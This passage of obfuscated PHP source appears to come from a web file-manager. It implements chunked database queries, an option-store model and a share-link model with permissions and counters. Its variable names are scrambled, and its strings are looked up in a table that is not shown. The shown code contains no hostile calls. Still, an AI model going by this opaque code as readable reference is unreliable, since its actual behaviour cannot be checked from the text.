$this->db->insertAll($¹—ë”ÌÌ, $Ãš×¬şë, $‘ªÎüÊÜ); $this->chunkEventCheck(count($¹—ë”ÌÌ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($äŠ„ØŞ˜ as $ı–öı  => $ÓÚı½€) { $Ü¯Ëµ¦Ä = $this->db->insert($ÓÚı½€, $Ãš×¬şë, $‘ªÎüÊÜ); } $this->commit(); } if (!1 !== $Ü¯Ëµ¦Ä) { $Æ œì•˜ = $this->getLastInsID(); if ($Æ œì•˜) { return $Æ œì•˜; } } return $Ü¯Ëµ¦Ä; } public function save($Î…ÓË„ = '', $†¼®›®ø = array()) { $í§¢¬éŒ =& $_SERVER[÷åé¼î]; $ÇĞŸÓ¿  = self::SQL_WHERE_IN_CHUNK; $˜ôİ’âô = $this->optionsValue(); $Ò•…İ¸ = $this->findWhereField($˜ôİ’âô); if (!$Ò•…İ¸) { return parent::save($Î…ÓË„, $†¼®›®ø); } $ğÌàÑå = 0; $¾¥¼øúø = $˜ôİ’âô[$í§¢¬éŒ[336]][$Ò•…İ¸][1]; $¾¥¼øúø = is_array($¾¥¼øúø) ? $¾¥¼øúø : array(); $ŸøŞõğÎ = count($¾¥¼øúø); for ($Â­Á±¬ = 0; $Â­Á±¬ < $ŸøŞõğÎ; $Â­Á±¬ += $ÇĞŸÓ¿ ) { $é³†‹ı° = array_slice($¾¥¼øúø, $Â­Á±¬, $ÇĞŸÓ¿ ); if (!is_array($é³†‹ı°) || count($é³†‹ı°) == 0) { break; } $˜ôİ’âô[$í§¢¬éŒ[336]][$Ò•…İ¸][1] = $é³†‹ı°; $this->optionsValue($˜ôİ’âô); $ğÌàÑå += parent::save($Î…ÓË„, $†¼®›®ø); $this->chunkEventCheck(count($é³†‹ı°)); } $this->chunkEventSet(); return $ğÌàÑå; } public function add($¯ı¿¢Â˜ = '', $Ö„‰À‡ü = array(), $¼šæÔå“ = false) { if ($this->addTaskStatus && is_array($¯ı¿¢Â˜)) { $this->addTaskData[] = $¯ı¿¢Â˜; return; } return parent::add($¯ı¿¢Â˜, $Ö„‰À‡ü, $¼šæÔå“); } public function parseWhereLike($ª’ÔƒßÙ, $Æç‰Äƒ¢ = '', $ç¦¤’ğ¯ = false, &$¯ôÄŒÚ¾ = false) { $ü Ì“¤ =& $_SERVER[÷åé¼î]; $ñíë¢È = $GLOBALS[$ü Ì“¤[6]][$ü Ì“¤[441]]; if (!$ñíë¢È[$ü Ì“¤[442]]) { return $ª’ÔƒßÙ; } if (!is_array($ª’ÔƒßÙ)) { return $ª’ÔƒßÙ; } $«‹øÏ†¯ = array(); $¦Ñ ç“ô = 0; foreach ($ª’ÔƒßÙ as $äÃ’ŸøË => $åÜÒ‰´í) { if (is_array($åÜÒ‰´í) && count($åÜÒ‰´í) == 2 && $åÜÒ‰´í[0] == $ü Ì“¤[443] && is_string($åÜÒ‰´í[1]) && substr($åÜÒ‰´í[1], 0, 1) == $ü Ì“¤[444] && substr($åÜÒ‰´í[1], strlen($åÜÒ‰´í[1]) - 1, 1) == $ü Ì“¤[444]) { $¯ôÄŒÚ¾ = !0; $Õß·´ñ = is_string($äÃ’ŸøË) ? $äÃ’ŸøË : $Æç‰Äƒ¢; $¾ÌùŞã– = substr($åÜÒ‰´í[1], 1, strlen($åÜÒ‰´í[1]) - 2); $¾ÌùŞã– = $this->db->escapeString($¾ÌùŞã–); if (!strpos($Õß·´ñ, $ü Ì“¤[10])) { $Õß·´ñ = $ü Ì“¤[445] . $Õß·´ñ . $ü Ì“¤[445]; } $Üêæ—½ã = $ü Ì“¤[220] . $¾ÌùŞã– . $ü Ì“¤[220]; $¾ÌùŞã– = str_replace(array($ü Ì“¤[10], $ü Ì“¤[446], $ü Ì“¤[11]), $ü Ì“¤[447], $¾ÌùŞã–); if ($ñíë¢È[$ü Ì“¤[448]]) { $Üêæ—½ã = $ü Ì“¤[449] . $¾ÌùŞã– . $ü Ì“¤[450]; if ($ñíë¢È[$ü Ì“¤[451]]) { $Üêæ—½ã = $ü Ì“¤[450] . $¾ÌùŞã– . $ü Ì“¤[449]; } } $«‹øÏ†¯[$¦Ñ ç“ô] = $ü Ì“¤[452] . $Õß·´ñ . $ü Ì“¤[453] . $Üêæ—½ã . $ü Ì“¤[454]; $¦Ñ ç“ô++; continue; } if (is_array($åÜÒ‰´í)) { $Æç‰Äƒ¢ = is_string($äÃ’ŸøË) ? $äÃ’ŸøË : $Æç‰Äƒ¢; $åÜÒ‰´í = $this->parseWhereLike($åÜÒ‰´í, $Æç‰Äƒ¢, !0, $¯ôÄŒÚ¾); } if (is_numeric($äÃ’ŸøË)) { $«‹øÏ†¯[$¦Ñ ç“ô] = $åÜÒ‰´í; $¦Ñ ç“ô++; } else { $«‹øÏ†¯[$äÃ’ŸøË] = $åÜÒ‰´í; } } if ($¯ôÄŒÚ¾ && !$ç¦¤’ğ¯) { } return $«‹øÏ†¯; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ğ¯Øú£ = array()) { $Ô²²æµ =& $_SERVER[÷åé¼î]; $ã¼Õ•¦ª = self::SQL_WHERE_IN_CHUNK; $Ä±ëáô¬ = $this->optionsValue(); $Œ…´Ş·ü = $this->findWhereField($Ä±ëáô¬); if (!$Œ…´Ş·ü || isset($Ä±ëáô¬[$Ô²²æµ[352]]) || isset($Ä±ëáô¬[$Ô²²æµ[413]])) { return parent::select($Ğ¯Øú£); } $êøÑ¾‚õ = $Ä±ëáô¬[$Ô²²æµ[336]][$Œ…´Ş·ü][1]; $êøÑ¾‚õ = is_array($êøÑ¾‚õ) ? $êøÑ¾‚õ : array(); $µÕ£Ûµ‰ = null; for ($èÆµØß¸ = 0; $èÆµØß¸ < count($êøÑ¾‚õ); $èÆµØß¸ += $ã¼Õ•¦ª) { $ùğóÁä = array_slice($êøÑ¾‚õ, $èÆµØß¸, $ã¼Õ•¦ª); if (!is_array($ùğóÁä) || count($ùğóÁä) == 0) { break; } $Ä±ëáô¬[$Ô²²æµ[336]][$Œ…´Ş·ü][1] = $ùğóÁä; $this->optionsValue($Ä±ëáô¬); $ŞÒ‚¢ƒ = parent::select($Ğ¯Øú£); if (!$ŞÒ‚¢ƒ) { continue; } $µÕ£Ûµ‰ = is_array($µÕ£Ûµ‰) ? $µÕ£Ûµ‰ : array(); $µÕ£Ûµ‰ = array_merge($µÕ£Ûµ‰, $ŞÒ‚¢ƒ); } return $µÕ£Ûµ‰; } public function delete($í¹¹›•ş = array()) { $ñ¯áøË =& $_SERVER[÷åé¼î]; $Ò’êÓ = self::SQL_WHERE_IN_CHUNK; $¤èìßÌŒ = $this->optionsValue(); $ûóßæ¦ = $this->findWhereField($¤èìßÌŒ); if (!$ûóßæ¦) { return parent::delete($í¹¹›•ş); } $ØÊ³ùíÍ = 0; $—‘¡®² = $¤èìßÌŒ[$ñ¯áøË[336]][$ûóßæ¦][1]; $—‘¡®² = is_array($—‘¡®²) ? $—‘¡®² : array(); for ($˜”Û–Ûı = 0; $˜”Û–Ûı < count($—‘¡®²); $˜”Û–Ûı += $Ò’êÓ) { $¬ô½ï = array_slice($—‘¡®², $˜”Û–Ûı, $Ò’êÓ); if (!is_array($¬ô½ï) || count($¬ô½ï) == 0) { break; } $¤èìßÌŒ[$ñ¯áøË[336]][$ûóßæ¦][1] = $¬ô½ï; $this->optionsValue($¤èìßÌŒ); $ØÊ³ùíÍ += parent::delete($í¹¹›•ş); } return $ØÊ³ùíÍ; } private function findWhereField($ƒˆÂ÷ïÑ) { $ş»ÎèŸ =& $_SERVER[÷åé¼î]; $…é£¹¥Ô = self::SQL_WHERE_IN_CHUNK; if (!is_array($ƒˆÂ÷ïÑ) || !is_array($ƒˆÂ÷ïÑ[$ş»ÎèŸ[336]])) { return !1; } foreach ($ƒˆÂ÷ïÑ[$ş»ÎèŸ[336]] as $Ü«†ˆø => $‘ª¯êò¢) { if (is_array($‘ª¯êò¢) && isset($‘ª¯êò¢[0]) && is_string($‘ª¯êò¢[0]) && strtolower($‘ª¯êò¢[0]) == $ş»ÎèŸ[7] && is_array($‘ª¯êò¢[1]) && count($‘ª¯êò¢[1]) > $…é£¹¥Ô) { ignore_timeout(); return $Ü«†ˆø; } } return !1; } public function setMasterDB($ğ–°¸ÌÜ = true) { think_config($_SERVER[÷åé¼î][455], $ğ–°¸ÌÜ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\x65\155\117\x70\164\151\x6f\156"; public $field = array(); public function listData($Š˜é€ùœ = false, $üÉÒ¬á÷ = "\155\x6f\144\x69\146\171\124\151\x6d\145", $Ñàş¶ü = false) { $Í€Š“Íá = Model($this->modelType)->get(!1, $this->optionType, !0); $ÉµöîóÔ = array_values($Í€Š“Íá); if ($ÉµöîóÔ && $ÉµöîóÔ[0] && !is_array($ÉµöîóÔ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Í€Š“Íá = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Í€Š“Íá) { return $Š˜é€ùœ ? null : array(); } if (!$Š˜é€ùœ) { $Í€Š“Íá = array_filter(array_values($Í€Š“Íá)); return array_sort_by($Í€Š“Íá, $üÉÒ¬á÷, $Ñàş¶ü); } return $Í€Š“Íá[$_SERVER[÷åé¼î][456] . $Š˜é€ùœ]; } public function insert($ã»Ô±­”) { $ä´›‡× =& $_SERVER[÷åé¼î]; $ã»Ô±­” = array_field_key($ã»Ô±­”, $this->field); $õ¸¼İø = Model($this->modelType)->get($ä´›‡×[457], $this->optionType . $ä´›‡×[458]); $õ¸¼İø = $õ¸¼İø ? $õ¸¼İø : 0; $ã»Ô±­”[$ä´›‡×[459]] = ++$õ¸¼İø; $ã»Ô±­”[$ä´›‡×[231]] = time(); $ã»Ô±­”[$ä´›‡×[88]] = time(); Model($this->modelType)->set($ä´›‡×[457], $õ¸¼İø, $this->optionType . $ä´›‡×[458]); Model($this->modelType)->set($ä´›‡×[456] . $õ¸¼İø, $ã»Ô±­”, $this->optionType); return $õ¸¼İø; } public function update($¾±´ĞÙò, $ Ë Şµ„) { $ ‘Ğ¢İ“ =& $_SERVER[÷åé¼î]; $ Ë Şµ„ = array_field_key($ Ë Şµ„, $this->field); $å±úà¿ë = $this->listData($¾±´ĞÙò); if (!$å±úà¿ë || !$¾±´ĞÙò) { return !1; } $ Ë Şµ„ = array_merge($å±úà¿ë, $ Ë Şµ„); $ Ë Şµ„[$ ‘Ğ¢İ“[88]] = time(); return Model($this->modelType)->set($ ‘Ğ¢İ“[456] . $¾±´ĞÙò, $ Ë Şµ„, $this->optionType); } public function remove($‚‚äùÔÔ) { if (!$‚‚äùÔÔ) { return !1; } return Model($this->modelType)->remove($_SERVER[÷åé¼î][456] . $‚‚äùÔÔ, $this->optionType); } public function clear() { $á¨ú„Í =& $_SERVER[÷åé¼î]; Model($this->modelType)->remove($á¨ú„Í[457], $this->optionType . $á¨ú„Í[458]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¯¿¶²”, $ñÊ¾—õÙ) { if (!$ñÊ¾—õÙ) { return !1; } $ûõÛ–• = $this->listData(); $ûõÛ–• = array_to_keyvalue($ûõÛ–•, $¯¿¶²”); return isset($ûõÛ–•[$ñÊ¾—õÙ]) ? $ûõÛ–•[$ñÊ¾—õÙ] : !1; } public function findByName($Î¤†øòˆ) { return $this->findByKey($_SERVER[÷åé¼î][32], $Î¤†øòˆ); } protected function resetData($àÛ§ü²) { $âûÌ¥É =& $_SERVER[÷åé¼î]; $àÛ§ü² = is_array($àÛ§ü²) ? $àÛ§ü² : array(); $¤ï¯Îâğ = array(); for ($š¹âÙìÒ = 0; $š¹âÙìÒ < count($àÛ§ü²); $š¹âÙìÒ++) { $¤ï¯Îâğ[$âûÌ¥É[456] . $àÛ§ü²[$š¹âÙìÒ][$âûÌ¥É[459]]] = $àÛ§ü²[$š¹âÙìÒ]; } return Model($this->modelType)->set($¤ï¯Îâğ, !1, $this->optionType); } private function getAutoName($şÙø ¢§) { $¥„ìáŞÕ = array_to_keyvalue($this->listData(), $_SERVER[÷åé¼î][32]); if (!$¥„ìáŞÕ || !isset($¥„ìáŞÕ[$şÙø ¢§])) { return $şÙø ¢§; } for ($ÁåËï¬Å = 1; $ÁåËï¬Å < count($¥„ìáŞÕ); $ÁåËï¬Å++) { $£øÜß­¤ = $şÙø ¢§ . "\50{$ÁåËï¬Å}\x29"; if (!isset($¥„ìáŞÕ[$£øÜß­¤])) { return $£øÜß­¤; } } return $£øÜß­¤; } } goto FšÈ‡¨É¦Ÿ; CÏº•ç©œÚ: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\151\x6d\x65", "\164\151\155\x65", "\151\156\163\x65\162\x74\54\165\x70\144\141\x74\x65", "\x66\x75\156\x63\x74\x69\x6f\156"), array("\143\162\x65\x61\x74\145\x54\151\155\145", "\164\x69\155\145", "\151\156\163\145\x72\x74", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\x6f\160\x74\151\x6f\156\x73", '', "\x69\x6e\163\x65\162\x74\54\x75\x70\x64\141\x74\x65\54\x73\145\154\145\x63\x74", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ü½¶ÀÓä) { $şŒêãÕ¦ =& $_SERVER[÷åé¼î]; $‚÷ªã = isset($ü½¶ÀÓä[0]) ? $ü½¶ÀÓä[0] : !1; return array($şŒêãÕ¦[2120] => array(USER_ID, $şŒêãÕ¦[2121]), $şŒêãÕ¦[2061] => array($‚÷ªã, $şŒêãÕ¦[2122])); } protected function listSimple() { $à¿ÔÇÔ = array($_SERVER[÷åé¼î][1779] => USER_ID); $œÍ”Ç¾ = $this->field($this->fieldList)->where($à¿ÔÇÔ)->select(); return $œÍ”Ç¾ ? $œÍ”Ç¾ : array(); } protected function getInfo($üëşåœ, $ëÏÎÆ = false) { $ÄÉóÖ© =& $_SERVER[÷åé¼î]; if ($ëÏÎÆ) { return $this->_getShareInfo(array($ÄÉóÖ©[649] => $üëşåœ)); } $±® ¨•ã = $this->cacheFunctionGet($ÄÉóÖ©[2063], $üëşåœ); return $±® ¨•ã; } public function getInfoByHash($Ÿ‡…°æ) { return $this->_getShareInfo(array($_SERVER[÷åé¼î][2123] => $Ÿ‡…°æ)); } public function getInfoByPath($ıèà®ÑÚ) { $×ó‘Éèş =& $_SERVER[÷åé¼î]; $Ò›Š…‚• = array($×ó‘Éèş[1779] => USER_ID, $×ó‘Éèş[193] => $ıèà®ÑÚ); return $this->_getShareInfo($Ò›Š…‚•); } public function getInfoBySourcePath($—Ç•Ò¢Í) { $ò¥„±ñ¶ =& $_SERVER[÷åé¼î]; $Ú±¥‘‹¯ = array($ò¥„±ñ¶[1779] => USER_ID, $ò¥„±ñ¶[1251] => $—Ç•Ò¢Í); return $this->_getShareInfo($Ú±¥‘‹¯); } private function _getShareInfo($š’¶¡êÖ) { $³„’îÆû =& $_SERVER[÷åé¼î]; $É¦äôëæ = $this->where($š’¶¡êÖ)->find(); if (!$É¦äôëæ) { return !1; } $š’¶¡êÖ = array($³„’îÆû[649] => $É¦äôëæ[$³„’îÆû[649]]); $õªïò« = $³„’îÆû[2124]; $Ş¼® ˜² = Model($³„’îÆû[650])->order($³„’îÆû[459])->field($õªïò«)->where($š’¶¡êÖ)->select(); if ($É¦äôëæ[$³„’îÆû[193]] == $³„’îÆû[228]) { $É¦äôëæ[$³„’îÆû[90]] = IO::info($É¦äôëæ[$³„’îÆû[1251]]); } else { $É¦äôëæ[$³„’îÆû[90]] = Model($³„’îÆû[1414])->pathInfo($É¦äôëæ[$³„’îÆû[193]]); } $É¦äôëæ[$³„’îÆû[2125]] = $Ş¼® ˜²; return $É¦äôëæ; } protected function getInfoAuth($« ãÑµ–) { $®ºŒ¨µÍ =& $_SERVER[÷åé¼î]; $ˆÛÖà‚× = $this->getInfo($« ãÑµ–); if ($ˆÛÖà‚×[$®ºŒ¨µÍ[1779]] == USER_ID) { $ˆÛÖà‚×[$®ºŒ¨µÍ[471]] = $ˆÛÖà‚×[$®ºŒ¨µÍ[90]][$®ºŒ¨µÍ[471]]; } else { $ˆÛÖà‚×[$®ºŒ¨µÍ[471]] = Model($®ºŒ¨µÍ[551])->authMake($ˆÛÖà‚×[$®ºŒ¨µÍ[2125]]); } return $ˆÛÖà‚×; } protected function listData($üÂÎ®„í = null, $åóØÜ = 300) { $ çÙ¶Û =& $_SERVER[÷åé¼î]; $‹ğ£´öŒ = array(array($ çÙ¶Û[546] => array($ çÙ¶Û[1084], 0), $ çÙ¶Û[647] => array($ çÙ¶Û[1084], 0), $ çÙ¶Û[2126] => $ çÙ¶Û[2079])); if ($üÂÎ®„í == $ çÙ¶Û[2127]) { $‹ğ£´öŒ = array($ çÙ¶Û[546] => 1); } else { if ($üÂÎ®„í == $ çÙ¶Û[1236]) { $‹ğ£´öŒ = array($ çÙ¶Û[647] => 1); } } $‹ğ£´öŒ[$ çÙ¶Û[1779]] = USER_ID; $àËöåù“ = $this->where($‹ğ£´öŒ)->selectPage($åóØÜ); return $àËöåù“; } protected function listToMe($„¥ = 300) { $ÄÌª•ğ =& $_SERVER[÷åé¼î]; $Šğì›Ê = Model($ÄÌª•ğ[2128])->userGroupParents(USER_ID); $šŠÂ†Œ‰ = array($ÄÌª•ğ[632] => SourceModel::TYPE_USER, $ÄÌª•ğ[553] => USER_ID); if ($Šğì›Ê) { $šŠÂ†Œ‰ = array(array($ÄÌª•ğ[632] => SourceModel::TYPE_USER, $ÄÌª•ğ[553] => USER_ID), array($ÄÌª•ğ[632] => SourceModel::TYPE_GROUP, $ÄÌª•ğ[553] => array($ÄÌª•ğ[7], $Šğì›Ê)), $ÄÌª•ğ[2126] => $ÄÌª•ğ[2079]); } $·ÒäØ±Õ = Model($ÄÌª•ğ[650])->where($šŠÂ†Œ‰)->selectPage($„¥); $­Ì…˜® = array_to_keyvalue_group($·ÒäØ±Õ[$ÄÌª•ğ[429]], $ÄÌª•ğ[649]); if (!$­Ì…˜®) { return $·ÒäØ±Õ; } $êÕÈæÇÜ = $ÄÌª•ğ[2129]; $šŠÂ†Œ‰ = array($ÄÌª•ğ[649] => array($ÄÌª•ğ[476], array_keys($­Ì…˜®)), $ÄÌª•ğ[1779] => array($ÄÌª•ğ[1086], $ÄÌª•ğ[228])); $Öø«×£ = $this->field($êÕÈæÇÜ)->where($šŠÂ†Œ‰)->select(); foreach ($Öø«×£ as $º©­İ€ => &$î»õ­Éö) { $î»õ­Éö[$ÄÌª•ğ[2125]] = $­Ì…˜®[$î»õ­Éö[$ÄÌª•ğ[649]]]; } unset($î»õ­Éö); $¯Ö²¯¸Î = array($ÄÌª•ğ[2130] => $Öø«×£, $ÄÌª•ğ[2131] => $·ÒäØ±Õ[$ÄÌª•ğ[426]]); return $¯Ö²¯¸Î; } protected function shareAdd($¢Äç“Ãô, $ÜŞşœ) { $áïáŞÚ =& $_SERVER[÷åé¼î]; $–¼ÜŞâã = $this->_addShareData($¢Äç“Ãô, $ÜŞşœ); if (!empty($ÜŞşœ[$áïáŞÚ[2132]])) { $this->_shareAuthSet($–¼ÜŞâã, $ÜŞşœ[$áïáŞÚ[2132]]); } $this->shareEventAdd($¢Äç“Ãô, $ÜŞşœ, $áïáŞÚ[2133]); return $–¼ÜŞâã; } protected function shareAddSystem($àÒÆ¶³, $¦šÈŒµÅ) { $íŸåØ§© =& $_SERVER[÷åé¼î]; $ˆ³­Şï² = $this->_addShareData($àÒÆ¶³, $¦šÈŒµÅ, $íŸåØ§©[191]); $this->_shareAuthSet($ˆ³­Şï², $¦šÈŒµÅ[$íŸåØ§©[2132]]); return $ˆ³­Şï²; } private function shareEventAdd($ªËØ÷ûÄ, $Æõ„šÍ¦, $Ö´ñƒ¸¬ = "\x61\x64\x64") { $•Ó“ı¤™ =& $_SERVER[÷åé¼î]; if (!$ªËØ÷ûÄ || $ªËØ÷ûÄ == $•Ó“ı¤™[228]) { return; } if ($Ö´ñƒ¸¬ == $•Ó“ı¤™[2133]) { if ($Æõ„šÍ¦[$•Ó“ı¤™[546]] == $•Ó“ı¤™[91]) { Model($•Ó“ı¤™[617])->eventShare($ªËØ÷ûÄ, $•Ó“ı¤™[2134]); } if ($Æõ„šÍ¦[$•Ó“ı¤™[647]] == $•Ó“ı¤™[91]) { Model($•Ó“ı¤™[617])->eventShare($ªËØ÷ûÄ, $•Ó“ı¤™[2135]); } return; } $èŞÔˆìÙ = $this->getInfoByPath($ªËØ÷ûÄ); $ÒØİ Ğ‘ = $•Ó“ı¤™[2136]; if ($èŞÔˆìÙ[$•Ó“ı¤™[546]] == $•Ó“ı¤™[228] && $Æõ„šÍ¦[$•Ó“ı¤™[546]] == $•Ó“ı¤™[91]) { $ÒØİ Ğ‘ = $•Ó“ı¤™[2134]; } if ($èŞÔˆìÙ[$•Ó“ı¤™[546]] == $•Ó“ı¤™[91] && $Æõ„šÍ¦[$•Ó“ı¤™[546]] == $•Ó“ı¤™[228]) { $ÒØİ Ğ‘ = $•Ó“ı¤™[2137]; } if ($èŞÔˆìÙ[$•Ó“ı¤™[647]] == $•Ó“ı¤™[228] && $Æõ„šÍ¦[$•Ó“ı¤™[647]] == $•Ó“ı¤™[91]) { $ÒØİ Ğ‘ = $•Ó“ı¤™[2135]; } if ($èŞÔˆìÙ[$•Ó“ı¤™[647]] == $•Ó“ı¤™[91] && $Æõ„šÍ¦[$•Ó“ı¤™[647]] == $•Ó“ı¤™[228]) { $ÒØİ Ğ‘ = $•Ó“ı¤™[2138]; } Model($•Ó“ı¤™[617])->eventShare($ªËØ÷ûÄ, $ÒØİ Ğ‘); return; } private function _addShareData($°êÆÔ¶Ë, $Éù¨†Ÿ = array(), $¤úÊ…– = false) { $×µŸÁ =& $_SERVER[÷åé¼î]; $ò€„¾µø = $¤úÊ…– == $×µŸÁ[191] ? 0 : USER_ID; $—˜ı–ü = array($×µŸÁ[475] => $°êÆÔ¶Ë, $×µŸÁ[1770] => $ò€„¾µø); if ($°êÆÔ¶Ë == 0) { $—˜ı–ü = array($×µŸÁ[2139] => $Éù¨†Ÿ[$×µŸÁ[1251]], $×µŸÁ[1770] => $ò€„¾µø); } if ($­†Ñš–« = $this->where($—˜ı–ü)->find()) { return $­†Ñš–«[$×µŸÁ[649]]; } if ($°êÆÔ¶Ë == 0) { $ê¸Íô‚š = array($×µŸÁ[32] => get_path_this($Éù¨†Ÿ[$×µŸÁ[87]])); } else { $ê¸Íô‚š = Model($×µŸÁ[889])->sourceInfo($°êÆÔ¶Ë); if (!$ê¸Íô‚š) { return !1; } } if (!$Éù¨†Ÿ[$×µŸÁ[1668]]) { $Éù¨†Ÿ[$×µŸÁ[1668]] = $ê¸Íô‚š[$×µŸÁ[32]]; } $°¦ïèÍé = array($×µŸÁ[1770] => $ò€„¾µø, $×µŸÁ[475] => $°êÆÔ¶Ë, $×µŸÁ[1668] => $×µŸÁ[12], $×µŸÁ[546] => 0, $×µŸÁ[647] => 0, $×µŸÁ[1251] => $×µŸÁ[12], $×µŸÁ[367] => $×µŸÁ[12], $×µŸÁ[961] => $×µŸÁ[12], $×µŸÁ[2140] => 0, $×µŸÁ[2141] => 0, $×µŸÁ[826] => 0, $×µŸÁ[2142] => $×µŸÁ[12], $×µŸÁ[2123] => $×µŸÁ[12]); $É±î²Ï = explode($×µŸÁ[50], $×µŸÁ[2143]); foreach ($É±î²Ï as $—€Ôƒúš) { if (!isset($Éù¨†Ÿ[$—€Ôƒúš])) { continue; } $°¦ïèÍé[$—€Ôƒúš] = $Éù¨†Ÿ[$—€Ôƒúš]; } $…ƒé©«È = $this->add($°¦ïèÍé); $ö¶˜•‚Ñ = array($×µŸÁ[2123] => short_id($…ƒé©«È)); $this->where(array($×µŸÁ[2144] => $…ƒé©«È))->save($ö¶˜•‚Ñ); return $…ƒé©«È; } private function _shareAuthSet($ø”üüˆĞ, $©‹‰›É–) { $ÛÑŞÅí— =& $_SERVER[÷åé¼î]; if (!is_array($©‹‰›É–)) { return !1; } $Ô¿Õú› = Model($ÛÑŞÅí—[2089]); $Ô¿Õú›->where(array($ÛÑŞÅí—[649] => $ø”üüˆĞ))->delete(); $·ûÀ†Ç = array(); foreach ($©‹‰›É– as $µ÷ôÄÙÆ) { $Éç³Ûİö = SourceModel::TYPE_USER; if ($µ÷ôÄÙÆ[$ÛÑŞÅí—[190]] == SourceModel::TYPE_GROUP) { $Éç³Ûİö = SourceModel::TYPE_GROUP; } $¼ì«äå£ = array($ÛÑŞÅí—[649] => $ø”üüˆĞ, $ÛÑŞÅí—[190] => $Éç³Ûİö, $ÛÑŞÅí—[553] => intval($µ÷ôÄÙÆ[$ÛÑŞÅí—[553]]), $ÛÑŞÅí—[2085] => 0, $ÛÑŞÅí—[2145] => -1); if ($µ÷ôÄÙÆ[$ÛÑŞÅí—[2085]]) { $¼ì«äå£[$ÛÑŞÅí—[2085]] = $µ÷ôÄÙÆ[$ÛÑŞÅí—[2085]]; } else { if ($µ÷ôÄÙÆ[$ÛÑŞÅí—[2145]]) { $¼ì«äå£[$ÛÑŞÅí—[2145]] = $µ÷ôÄÙÆ[$ÛÑŞÅí—[2145]]; } } $·ûÀ†Ç[] = $¼ì«äå£; } return $Ô¿Õú›->addAll($·ûÀ†Ç, array(), !0); } public function numViewAdd($ØÑŸì·ı) { $ë©ø’Óù =& $_SERVER[÷åé¼î]; $€åó˜¾ = array($ë©ø’Óù[2144] => $ØÑŸì·ı); $this->where($€åó˜¾)->setAdd($ë©ø’Óù[2140]); } public function numDownloadAdd($„÷†Ê›¦) { $Óí·Ïˆ =& $_SERVER[÷åé¼î]; $Ô–‘¿ = array($Óí·Ïˆ[2144] => $„÷†Ê›¦); $this->where($Ô–‘¿)->setAdd($Óí·Ïˆ[2141]); } protected function shareEdit($Ù‡¥Ü–, $‘Êé«¾¤) { $ú›¸Ö©é =& $_SERVER[÷åé¼î]; $à˜îÜ¡­ = $this->getInfo($Ù‡¥Ü–); if (!$à˜îÜ¡­) { return !1; } $this->_checkLinkShare($‘Êé«¾¤, $à˜îÜ¡­); $Î³¥‘ìÉ = array(); $¿Œ¥¤…Ö = explode($ú›¸Ö©é[50], $ú›¸Ö©é[2146]); foreach ($¿Œ¥¤…Ö as $ÃœòŒø·) { if (!array_key_exists($ÃœòŒø·, $‘Êé«¾¤)) { continue; } $Î³¥‘ìÉ[$ÃœòŒø·] = $‘Êé«¾¤[$ÃœòŒø·]; } $this->shareEventAdd($à˜îÜ¡­[$ú›¸Ö©é[193]], $‘Êé«¾¤, $ú›¸Ö©é[1947]); $this->where(array($ú›¸Ö©é[2144] => $Ù‡¥Ü–))->save($Î³¥‘ìÉ); if (isset($‘Êé«¾¤[$ú›¸Ö©é[2132]])) { $this->_shareAuthSet($Ù‡¥Ü–, $‘Êé«¾¤[$ú›¸Ö©é[2132]]); } return !0; } private function _checkLinkShare($¤”êª¹Å, $×ç¥ó¬ñ) { $”ºÀõÖ =& $_SERVER[÷åé¼î]; if ($¤”êª¹Å[$”ºÀõÖ[546]] != $”ºÀõÖ[91]) { return; } $æåàñÉ  = $×ç¥ó¬ñ[$”ºÀõÖ[90]][$”ºÀõÖ[193]]; if ($×ç¥ó¬ñ[$”ºÀõÖ[90]][$”ºÀõÖ[33]] != $”ºÀõÖ[230]) { $Ù¢“Š’É = $this->_folderReport($æåàñÉ ); if (!$Ù¢“Š’É) { return; } show_json(LNG($”ºÀõÖ[2147]) . $”ºÀõÖ[2148] . $Ù¢“Š’É, !1); } $§˜æéü„ = Model($”ºÀõÖ[889])->fileInfoGet($×ç¥ó¬ñ[$”ºÀõÖ[90]][$”ºÀõÖ[193]]); if (!$§˜æéü„) { return; } $‚ª´°œ = $this->shareFileMeta($§˜æéü„[$”ºÀõÖ[525]]); if (isset($‚ª´°œ[$”ºÀõÖ[434]]) && $‚ª´°œ[$”ºÀõÖ[434]] == $”ºÀõÖ[91]) { show_json(LNG($”ºÀõÖ[2149]), !1); } } private function _folderReport($ë¾Ö©ÔÄ) { $¤ü‘•Ûê =& $_SERVER[÷åé¼î]; $ëÉä’Ğ = array($¤ü‘•Ûê[525] => array($¤ü‘•Ûê[1084], 0), $¤ü‘•Ûê[815] => 3); $šÅúÙ¹è = Model($¤ü‘•Ûê[2150])->where($ëÉä’Ğ)->field($¤ü‘•Ûê[525])->select(); if (!$šÅúÙ¹è) { return !1; } $šÅúÙ¹è = array_to_keyvalue($šÅúÙ¹è, $¤ü‘•Ûê[12], $¤ü‘•Ûê[525]); $ÉÚ«¼½å = $¤ü‘•Ûê[50] . $ë¾Ö©ÔÄ . $¤ü‘•Ûê[50]; $ëÉä’Ğ = array($¤ü‘•Ûê[525] => array($¤ü‘•Ûê[7], $šÅúÙ¹è), $¤ü‘•Ûê[568] => array($¤ü‘•Ûê[443], "\45{$ÉÚ«¼½å}\45"), $¤ü‘•Ûê[489] => 0); $¬Ş„ñĞö = Model($¤ü‘•Ûê[889])->where($ëÉä’Ğ)->field($¤ü‘•Ûê[2151])->find(); if (!$¬Ş„ñĞö) { return !1; } $ÈÙ‹³ø = substr($¬Ş„ñĞö[$¤ü‘•Ûê[568]], strpos($¬Ş„ñĞö[$¤ü‘•Ûê[568]], $ÉÚ«¼½å)); $ëÉä’Ğ = array($¤ü‘•Ûê[193] => array($¤ü‘•Ûê[7], trim($ÈÙ‹³ø, $¤ü‘•Ûê[50]))); $‚í·êÑ­ = 